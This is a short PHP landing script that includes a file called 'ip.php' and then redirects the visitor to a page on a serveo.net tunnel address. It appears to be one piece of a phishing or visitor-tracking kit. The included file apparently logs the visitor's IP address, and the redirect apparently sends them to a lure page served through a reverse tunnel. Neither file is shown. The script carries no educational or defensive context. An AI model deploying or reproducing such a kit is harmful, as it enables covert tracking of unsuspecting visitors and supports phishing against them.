<?php
include 'ip.php';
header('Location: https://copie.serveo.net/index2.html');
exit
?>
